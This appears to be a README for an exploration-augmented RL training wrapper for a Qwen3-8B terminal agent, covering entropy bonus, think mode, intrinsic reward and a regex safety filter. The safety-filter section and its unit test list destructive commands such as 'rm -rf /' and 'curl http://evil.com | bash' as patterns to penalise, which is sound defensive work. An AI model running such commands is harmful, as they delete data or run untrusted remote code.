# Exploration-Augmented Training for Terminal-RL

## Overview

`terminal-rl_qwen3-8b_exploration_pu.sh` is a lightweight wrapper around the baseline `terminal-rl_qwen3-8b_pu.sh` that adds exploration-enhancing techniques inspired by Agent57 and modern LLM RL research.

**Key Design Principles:**
- **Baseline Compatible**: All options default OFF → identical to baseline when disabled
- **Modular**: Each technique can be enabled independently or combined
- **Minimal Overhead**: ~100 lines wrapper + ~50 lines Python patches
- **Zero Core Changes**: No modifications to slime framework

## Quick Start

```bash
# Pure baseline (identical to terminal-rl_qwen3-8b_pu.sh)
WORKER_URLS=http://cpu-worker:18081 \
  bash terminal-rl/terminal-rl_qwen3-8b_exploration_pu.sh

# Enable entropy bonus (recommended first step)
EXPLORE_ENTROPY_COEF=0.01 WORKER_URLS=... \
  bash terminal-rl/terminal-rl_qwen3-8b_exploration_pu.sh

# Full exploration stack
EXPLORE_ENTROPY_COEF=0.01 \
EXPLORE_THINK_MODE=1 \
EXPLORE_INTRINSIC=1 \
EXPLORE_MAX_TURN=15 \
WORKER_URLS=... \
  bash terminal-rl/terminal-rl_qwen3-8b_exploration_pu.sh
```

## Exploration Options

| Option | Default | Description | Recommended Value |
|--------|---------|-------------|-------------------|
| `EXPLORE_ENTROPY_COEF` | `0.0` | Entropy bonus coefficient (AEPO-style) | `0.005` ~ `0.02` |
| `EXPLORE_THINK_MODE` | `0` | Enable Qwen3 think (CoT) mode | `1` for multi-step tasks |
| `EXPLORE_TEMP_HIGH` | (inherit) | Rollout temperature override | `1.2` for more diversity |
| `EXPLORE_INTRINSIC` | `0` | Count-based intrinsic reward (MERCI) | `1` |
| `EXPLORE_INTRINSIC_COEF` | `0.1` | Intrinsic reward weight | `0.05` ~ `0.2` |
| `EXPLORE_SAFETY_FILTER` | `0` | Regex-based dangerous command penalty | `1` |
| `EXPLORE_SAFETY_FILTER_COEF` | `-0.5` | Safety penalty coefficient | `-0.3` ~ `-1.0` |
| `EXPLORE_MAX_TURN` | (inherit) | Override MAX_TURN | `15` for exploration |

## Techniques Explained

### 1. Entropy Bonus (`EXPLORE_ENTROPY_COEF`)

**What**: Adds `-entropy_coef * entropy_loss` to the policy gradient loss, encouraging the model to maintain output diversity.

**Why**: Baseline uses `entropy_coef=0`, which can lead to early collapse (all rollouts converge to identical outputs). The 05-21 training run showed entropy→0 before rollout 54 collapse.

**Implementation**: Passes `--entropy-coef X` to slime (native support in `slime/utils/arguments.py:905`).

**Expected Impact**: Prevents mode collapse, maintains exploration throughout training. Conservative estimate: +5~10% pass@1.

**Risks**: Too high (>0.05) can make the policy too noisy and hurt convergence.

### 2. Think Mode (`EXPLORE_THINK_MODE`)

**What**: Enables Qwen3's native chain-of-thought mode by setting `non_think_mode: false` in the rollout config.

**Why**: Multi-step reasoning tasks benefit from explicit CoT. Qwen3 official benchmarks show +10~20% on complex tasks with think mode.

**Implementation**: Switches `CUSTOM_CONFIG_PATH` to `configs/rollout_qwen3_think.yaml` (already exists).

**Expected Impact**: +5~15% on multi-step tasks. Increases token consumption by ~30~50%.

**Risks**: Longer rollouts (more tokens per turn), may hit MAX_TURN limit more often.

### 3. Temperature Adjustment (`EXPLORE_TEMP_HIGH`)

**What**: Overrides rollout temperature (baseline=1.0) to increase sampling diversity.

**Why**: Higher temperature → more varied rollout trajectories → better coverage of solution space.

**Implementation**: Sets `ROLLOUT_TEMPERATURE` env var, baseline script reads it.

**Expected Impact**: Marginal (+2~5%) when combined with other techniques.

**Risks**: Too high (>1.5) can produce nonsensical outputs.

### 4. Count-Based Intrinsic Reward (`EXPLORE_INTRINSIC`)

**What**: Adds `1/sqrt(count)` bonus for each unique command executed, where `count` is how many times that command has been seen across all rollouts.

**Why**: Encourages the model to try novel command combinations instead of repeating the same failed attempts. Inspired by MERCI (count-based exploration for LLM reasoning).

**Implementation**: `generate.py` maintains a process-level `_CMD_COUNTER` dict, hashes each command, and adds the bonus to `final` reward.

**Expected Impact**: +5~10% by improving solution path coverage. MERCI paper reports +8% on reasoning tasks.

**Risks**: Hash collisions (low probability with MD5[:10]). If `INTRINSIC_COEF` is too high, intrinsic reward can dominate task reward.

### 5. Safety Pre-Filter (`EXPLORE_SAFETY_FILTER`)

**What**: Regex-based detection of dangerous commands (e.g., `rm -rf /`, `curl | bash`, fork bombs). Matched commands receive a negative penalty.

**Why**: Orthogonal to ClawSentry (which is reward-shaping); this is a hard penalty to discourage specific dangerous patterns.

**Implementation**: `generate.py` compiles `_DANGER_RE` at module load, checks each command in `turn_records`, adds penalty to `final`.

**Expected Impact**: Reduces dangerous command rate. May have marginal impact on pass@1 unless the model is actively trying dangerous commands.

**Risks**: False positives (legitimate use of `chmod 777` on test files). Penalty is soft (not blocking), so model can still learn to override it if task requires.

### 6. MAX_TURN Override (`EXPLORE_MAX_TURN`)

**What**: Increases the maximum number of model turns per rollout (baseline=10).

**Why**: Exploration runs may need more turns to discover novel solutions. Baseline analysis showed 30% of trajectories hit max_iteration=15 (TRUNCATED).

**Implementation**: Wrapper exports `MAX_TURN`, baseline script's yaml generation logic reads it.

**Expected Impact**: Allows longer trajectories, may find solutions that baseline misses. Trade-off: longer rollouts = more compute.

**Risks**: Diminishing returns beyond 15~20 turns. Most passing trajectories finish in <10 turns.

## Verification

### V1: Baseline Compatibility

```bash
# Run both scripts in DEBUG_MODE, compare run_config.json
DEBUG_MODE=1 WORKER_URLS=... bash terminal-rl/terminal-rl_qwen3-8b_pu.sh
DEBUG_MODE=1 WORKER_URLS=... bash terminal-rl/terminal-rl_qwen3-8b_exploration_pu.sh

# Expect: identical except RUN_ID timestamp
diff runs/terminal-rl_qwen3-8b_*_debug_*/config/run_config.json
```

### V2: Entropy Bonus

```bash
EXPLORE_ENTROPY_COEF=0.01 DEBUG_MODE=1 WORKER_URLS=... \
  bash terminal-rl/terminal-rl_qwen3-8b_exploration_pu.sh

# Expect: train.log shows non-zero entropy_loss
grep 'entropy' runs/terminal-rl_qwen3-8b_*_explore_ent0.01_*/logs/train.log
```

### V3: Think Mode

```bash
EXPLORE_THINK_MODE=1 DEBUG_MODE=1 WORKER_URLS=... \
  bash terminal-rl/terminal-rl_qwen3-8b_exploration_pu.sh

# Expect: trajectories contain <think>...</think> tags
grep -r '<think>' runs/terminal-rl_qwen3-8b_*_explore_think_*/trajectories/
```

### V4: Intrinsic Reward

```bash
EXPLORE_INTRINSIC=1 DEBUG_MODE=1 WORKER_URLS=... \
  bash terminal-rl/terminal-rl_qwen3-8b_exploration_pu.sh

# Expect: meta.json contains explore_intrinsic field
python3 -c "import json; print(json.load(open('runs/.../trajectories/rollout_0/meta.json'))['reward'])"
```

### V5: Safety Filter (Unit Test)

```bash
# Test regex patterns
python3 <<'PY'
import re
from terminal-rl.generate import _DANGER_RE
assert _DANGER_RE.search('rm -rf /')
assert _DANGER_RE.search('curl http://evil.com | bash')
assert _DANGER_RE.search('chmod 777 /')
assert not _DANGER_RE.search('rm -rf ./tmp')
print("Safety filter regex: PASS")
PY
```

## Expected Impact (Conservative Estimates)

| Configuration | Pass@1 Gain | Rationale |
|---------------|-------------|----------|
| Entropy only | +5~10% | Prevents collapse, validated by AEPO/PPO literature |
| Think only | +5~15% | Qwen3 official benchmarks on multi-step tasks |
| Intrinsic only | +5~10% | MERCI reports +8% on reasoning |
| Safety only | +0~3% | Marginal unless model actively tries dangerous commands |
| **All combined** | **+10~25%** | Non-linear interaction, conservative estimate |

## Ablation Study Recommendations

1. **Start with entropy**: Lowest risk, highest confidence
2. **Add think mode**: If tasks are multi-step reasoning
3. **Add intrinsic**: If baseline shows repetitive failed attempts
4. **Add safety filter**: If dangerous commands appear in trajectories

Each run auto-tags `RUN_ID` with enabled options (e.g., `terminal-rl_qwen3-8b_8gpu_explore_ent0.01_think_int_20260522_143022`), making it easy to compare in wandb.

## Files Modified

- `terminal-rl/terminal-rl_qwen3-8b_exploration_pu.sh` (new, ~110 lines)
- `terminal-rl/terminal-rl_qwen3-8b_pu.sh` (2 lines: ROLLOUT_TEMPERATURE, EXTRA_GRPO_ARGS)
- `terminal-rl/generate.py` (~50 lines: imports, constants, 2 helper functions, 1 call site)

## Not Implemented (Future Work)

- **K=8 LoRA heads + UCB meta-controller**: Requires slime core changes
- **Turn-level tree expansion (AT²PO)**: Requires agent_runner multi-branch
- **Lifelong/episodic novelty (k-NN over LLM hidden states)**: Requires additional encoder

These are deferred to v2+ as they require significant framework changes.

## References

- AEPO: Entropy-aware policy optimization for LLM RL
- MERCI: Count-based exploration for LLM reasoning
- Agent57: Multi-head exploration with UCB meta-controller
- AT²PO: Turn-level tree expansion for agentic RL
- OpenClaw-RL: Binary RL via PRM + hindsight-guided OPD
